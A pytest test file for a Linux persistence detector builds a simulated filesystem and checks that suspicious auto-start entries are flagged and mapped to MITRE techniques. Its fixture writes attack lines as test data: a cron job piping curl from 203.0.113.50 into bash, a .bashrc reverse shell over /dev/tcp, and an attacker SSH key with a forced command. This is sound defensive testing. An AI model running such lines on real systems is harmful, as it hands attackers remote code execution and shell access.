# Copyright (C) 2026 ATAD Team (Hoor Fawaz, Danah Fawaz)
# SPDX-License-Identifier: LicenseRef-ATAD-SAL-1.0

"""Linux persistence collector on a SIMULATED file system tree."""

import os
import shutil

import pytest

from atad.adapters.base import ParseContext
from atad.correlation.engine import correlate
from atad.evidence.models import CollectionMode
from atad.modules.host import linux_persistence as lp
from atad.modules.host.collector import startup_to_evidence

KEY = "AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"


@pytest.fixture
def root(tmp_path):
    def w(rel, text, mode=0o644):
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        os.chmod(p, mode)
        return p
    w("etc/systemd/system/nginx.service", "[Service]\nExecStart=/usr/sbin/nginx -g 'daemon off;'\n")
    w("etc/systemd/system/sys-helper.service", "[Service]\nExecStart=/tmp/.cache/helper --quiet\n")
    w("usr/lib/systemd/system/ssh.service", "[Service]\nExecStart=-/usr/sbin/sshd -D\n")
    wants = tmp_path / "etc/systemd/system/multi-user.target.wants"
    wants.mkdir(parents=True)
    try:
        os.symlink("/usr/lib/systemd/system/ssh.service", wants / "ssh.service")
    except OSError:
        # Windows allows symlinks only with a special privilege; a plain copy
        # still tests that enabled units under *.wants are read.
        shutil.copy(tmp_path / "usr/lib/systemd/system/ssh.service", wants / "ssh.service")
    w("etc/crontab", "SHELL=/bin/sh\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    w("etc/cron.d/updater", "*/5 * * * * root curl -fsSL http://203.0.113.50/u.sh | bash\n")
    w("var/spool/cron/crontabs/deploy", "@reboot /dev/shm/.x/agent\n")
    w("etc/rc.local", "#!/bin/sh -e\n# comment\n/usr/local/bin/startup-check\nexit 0\n")
    w("home/deploy/.bashrc", "alias ll='ls -l'\nexport PATH=$PATH:~/bin\nbash -i >& /dev/tcp/203.0.113.50/4444 0>&1 &\n")
    w("root/.ssh/authorized_keys", f"ssh-ed25519 {KEY} admin@laptop\n"
                                   f'command="/tmp/.k/run",no-pty ssh-ed25519 {KEY} attacker\n')
    w("home/deploy/.config/systemd/user/sync.service", "[Service]\nExecStart=/home/deploy/bin/sync\n")
    return tmp_path


def test_collect_linux_persistence(root):
    cap = lp.collect_startup_linux(root)
    by = {(r["type"], r["name"]): r for r in cap["records"]}
    assert ("systemd", "nginx.service") in by and ("systemd", "ssh.service") in by
    assert by[("systemd", "ssh.service")]["executable"] == "/usr/sbin/sshd"        # '-' prefix removed
    assert by[("systemd", "sys-helper.service")]["suspicious_reasons"] == ["starts from a user-writable folder"]
    assert by[("systemd", "nginx.service")]["suspicious_reasons"] == []
    assert ("systemd", "sync.service") in by                                      # user unit
    cron = [r for r in cap["records"] if r["type"] == "cron"]
    assert len(cron) == 3
    upd = next(r for r in cron if "curl" in r["command"])
    assert "downloads and runs code (curl/wget piped to a shell)" in upd["suspicious_reasons"]
    assert next(r for r in cron if r["user"] == "deploy")["executable"] == "/dev/shm/.x/agent"
    assert [r["command"] for r in cap["records"] if r["type"] == "rc_local"] == ["/usr/local/bin/startup-check"]
    prof = [r for r in cap["records"] if r["type"] == "shell_profile"]
    assert len(prof) == 1 and "opens a network shell (/dev/tcp)" in prof[0]["suspicious_reasons"]
    keys = [r for r in cap["records"] if r["type"] == "authorized_keys"]
    assert [k["name"] for k in keys] == ["admin@laptop", "attacker"]
    assert keys[1]["executable"] == "/tmp/.k/run" and keys[1]["suspicious_reasons"]
    assert keys[0]["executable"] is None and keys[0]["suspicious_reasons"] == []


def test_s3_on_linux_entries(case, root):
    cap = lp.collect_startup_linux(root)
    ctx = ParseContext(case_id=case.case.id, host="web01", collection_mode=CollectionMode.LOCAL,
                       tool="linux-persistence")
    case.repo.add_evidence_many(startup_to_evidence(cap, ctx))
    s3 = {f.title: f for f in correlate(case.repo).findings if f.rule_id == "S3"}
    assert set(s3) == {"Suspicious auto-start: helper", "Suspicious auto-start: curl",
                       "Suspicious auto-start: agent", "Suspicious auto-start: bash",
                       "Suspicious auto-start: run"}
    assert "T1053.003" in s3["Suspicious auto-start: curl"].rationale
    assert "T1543.002" in s3["Suspicious auto-start: helper"].rationale
    assert "T1546.004" in s3["Suspicious auto-start: bash"].rationale
    assert "T1098.004" in s3["Suspicious auto-start: run"].rationale
    assert all(f.source_tool == "linux-persistence" for f in case.repo.list_evidence())
